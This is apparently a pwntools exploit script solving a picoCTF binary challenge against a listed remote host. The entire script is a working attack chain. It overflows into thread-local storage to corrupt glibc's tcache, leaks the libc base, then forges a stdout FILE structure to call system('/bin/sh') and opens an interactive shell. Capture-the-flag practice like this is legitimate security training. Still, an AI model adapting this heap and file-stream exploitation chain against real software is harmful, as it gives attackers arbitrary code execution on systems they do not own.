#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./hft_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc tethys.picoctf.net 57745"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def send_pkt(payload):
    io.sendlineafter(b"[PKT_RES]\n", payload)


# based on https://gist.github.com/unvariant/d9ae2d4abed948747ee4a93ce0ccb1c0

# https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1939
DEFAULT_MMAP_THRESHOLD = 0x20000  # (128 * 1024)
PAGE_SIZE = 0x1000
env = {}
io = start()

TLS_OFFSET = 0x22000
TCB_OFFSET = 0x740
TBSS_OFFSET = 0x6c0
TCACHE_OFFSET = 0x48 - 0x10

payload = flat(DEFAULT_MMAP_THRESHOLD + 0x1000, 0)
payload += b"A" * (TLS_OFFSET - 0x20 + TBSS_OFFSET + TCACHE_OFFSET)
payload += flat(
    0,  # tcache (tcache_perthread_struct)
    0,  # tcache_shutting_down
    0,  # thread_arena
)
# zeroes out tcache and thread_arena to force tcache and thread_arena
# initialization again
# (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3306)
send_pkt(payload)

payload = flat(0x1000 - 0x10, 0)
# trigger tcache and thread_arena initialization
send_pkt(payload)

payload = flat(DEFAULT_MMAP_THRESHOLD + 0x1000, 0)
payload += b"B" * (TLS_OFFSET * 2 - 0x20 + TBSS_OFFSET + TCACHE_OFFSET)
payload += p16(0x640)
# corrupt tcache to point to thread_arena.bins which has pointers to the
# arena address region
send_pkt(payload)


def tcache_size_by_idx(idx):
    return 0x10 + (idx * 0x10)


malloc_state_next_offset = 0x8a0
payload = flat(tcache_size_by_idx(0), 0)
# overwrite tcache idx 0x4 to point to malloc_state.next to leak libc address
payload += flat(0, 0, 0, 0, p16(malloc_state_next_offset - 0x10))
send_pkt(payload)

payload = flat(tcache_size_by_idx(4), 1)
send_pkt(payload[:-1])

io.recvuntil(b":[")
libc_leak = u64(io.recvuntil(b"]", drop=True).ljust(8, b"\x00"))
# log.info(f"{libc_leak=:#x}")
libc.address = libc_leak - libc.sym["main_arena"]
log.info(f"{libc.address=:#x}")
assert (libc.address & 0xfff == 0)

libc_stdout = libc.sym["_IO_2_1_stdout_"]
payload = flat(tcache_size_by_idx(0x10), 0)
payload += flat(0, 0, 0, 0, p64(libc_stdout - 0x10), 0)
send_pkt(payload[:-1])

gadget = libc.address + 0x0016a197  # add rdi, 0x10; jmp rcx;

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
# the function that we will call: system()
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock = libc.sym["_IO_stdfile_1_lock"]
fake._codecvt = libc_stdout + 0xb8
# _wide_data just need to points to empty zone
fake._wide_data = libc_stdout + 0x200
fake.unknown2 = (p64(0) * 2 + p64(libc_stdout + 0x20) +
                 p64(0) * 3 + p64(libc.sym['_IO_wfile_jumps'] - 0x18))

payload = flat(tcache_size_by_idx(0x14), 0)
send_pkt(payload + bytes(fake))

io.interactive()
